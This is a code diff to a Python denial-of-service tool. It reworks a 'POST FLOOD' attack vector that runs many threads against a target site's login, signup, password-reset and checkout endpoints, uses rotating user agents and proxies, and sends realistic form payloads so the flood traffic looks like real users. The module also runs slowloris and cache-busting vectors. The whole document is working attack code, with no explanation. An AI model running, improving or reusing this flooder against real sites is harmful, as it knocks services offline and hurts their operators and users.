@@ -229,16 +229,66 @@ def vector_slowloris(target_url: str, cfg: dict, logger: Optional[logging.Logger
     return _vector_result("slowloris", duration, stats)
 
 
+_FLOW_PAYLOADS: dict[str, dict] = {
+    "login": {
+        "email":    "test.user@example.com",
+        "password": "Password123!",
+    },
+    "signup": {
+        "email":            "newuser@example.com",
+        "username":         "testuser" + str(random.randint(1000, 9999)),
+        "password":         "Register123!",
+        "confirm_password": "Register123!",
+    },
+    "password_reset": {
+        "email": "forgot@example.com",
+    },
+    "checkout": {
+        "card_number": "4111111111111111",
+        "expiry":      "12/27",
+        "cvv":         "123",
+        "amount":      "99.99",
+        "email":       "buyer@example.com",
+    },
+    "sales": {
+        "name":    "Test User",
+        "email":   "sales@example.com",
+        "company": "TestCorp",
+        "message": "I would like a quote.",
+    },
+}
+
+_FLOW_KEYWORDS: dict[str, list[str]] = {
+    "login":          ["login", "signin", "sign-in", "auth", "session"],
+    "signup":         ["signup", "register", "sign-up", "create-account", "join"],
+    "password_reset": ["forgot", "reset", "recover", "lost-password"],
+    "checkout":       ["checkout", "cart", "basket", "bag", "purchase"],
+    "sales":          ["pricing", "plans", "buy", "quote", "contact-sales"],
+}
+
+
+def _flow_for_url(url: str) -> str:
+    lower = url.lower()
+    for flow, kws in _FLOW_KEYWORDS.items():
+        if any(kw in lower for kw in kws):
+            return flow
+    return "generic"
+
+
 def _post_flood_worker(endpoints: list[str], stats: _Stats, stop_event: threading.Event,
                        proxies: Optional[dict] = None) -> None:
     while not stop_event.is_set():
         url = random.choice(endpoints)
-        size = random.randint(128, 4096)
-        payload = "".join(random.choices(string.ascii_letters + string.digits, k=size))
+        flow = _flow_for_url(url)
+        if flow in _FLOW_PAYLOADS:
+            payload = _FLOW_PAYLOADS[flow].copy()
+        else:
+            size = random.randint(128, 4096)
+            payload = {"data": "".join(random.choices(string.ascii_letters + string.digits, k=size))}
         hdrs = {"User-Agent": random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
         t0 = time.time()
         try:
-            r = requests.post(url, data={"data": payload}, headers=hdrs,
+            r = requests.post(url, data=payload, headers=hdrs,
                               timeout=5, allow_redirects=False, proxies=proxies)
             stats.record(r.status_code, (time.time() - t0) * 1000)
         except Exception:
@@ -246,26 +296,39 @@ def _post_flood_worker(endpoints: list[str], stats: _Stats, stop_event: threadin
 
 
 def vector_post_flood(target_url: str, discovered_urls: list[str], cfg: dict,
+                      classified_flows: Optional[dict] = None,
                       logger: Optional[logging.Logger] = None) -> dict:
     phase_banner("DDOS VECTOR 3: POST FLOOD")
     duration = cfg.get("duration", 60)
     threads = 20
 
-    endpoint_keywords = ["checkout", "cart", "search", "login", "account", "panier", "recherche"]
-    endpoints = [u for u in discovered_urls
-                 if any(kw in u.lower() for kw in endpoint_keywords)]
-
     parsed = urlparse(target_url)
     base = f"{parsed.scheme}://{parsed.netloc}"
-    for path in ["/search", "/cart", "/checkout", "/login", "/account"]:
+
+    # Prefer real flow URLs discovered from the site crawl
+    endpoints: list[str] = []
+    if classified_flows:
+        for flow_urls in classified_flows.values():
+            endpoints.extend(flow_urls)
+
+    # Supplement with keyword-matching from discovered_urls
+    endpoint_keywords = ["checkout", "cart", "search", "login", "account", "signup", "register", "forgot", "reset"]
+    for u in discovered_urls:
+        if any(kw in u.lower() for kw in endpoint_keywords):
+            endpoints.append(u)
+
+    # Always add common guessed paths as fallback
+    for path in ["/login", "/signup", "/forgot-password", "/cart", "/checkout", "/search", "/account"]:
         endpoints.append(base + path)
 
     endpoints = list(set(endpoints)) or [target_url]
+
+    flow_summary = ", ".join(classified_flows.keys()) if classified_flows else "guessed paths"
+    log(f"[POST FLOOD] Targeting {len(endpoints)} endpoints ({flow_summary}) | {threads} threads", "warning", logger)
+
     stats = _Stats()
     stop_event = threading.Event()
     start = time.time()
-
-    log(f"[POST FLOOD] Targeting {len(endpoints)} endpoints | {threads} threads", "warning", logger)
 
     proxies = get_proxy_dict()
     with Live(console=console, refresh_per_second=2) as live:
@@ -353,6 +416,7 @@ def run(
     target_url: str,
     discovered_urls: list[str],
     cfg: dict,
+    classified_flows: Optional[dict] = None,
     logger: Optional[logging.Logger] = None,
 ) -> dict:
     pause = cfg.get("pause_between_vectors", 10)
@@ -364,7 +428,7 @@ def run(
     results["slowloris"] = vector_slowloris(target_url, cfg, logger)
     _pause_between(pause)
 
-    results["post_flood"] = vector_post_flood(target_url, discovered_urls, cfg, logger)
+    results["post_flood"] = vector_post_flood(target_url, discovered_urls, cfg, classified_flows, logger)
     _pause_between(pause)
 
     results["cache_buster"] = vector_cache_buster(target_url, discovered_urls, cfg, logger)
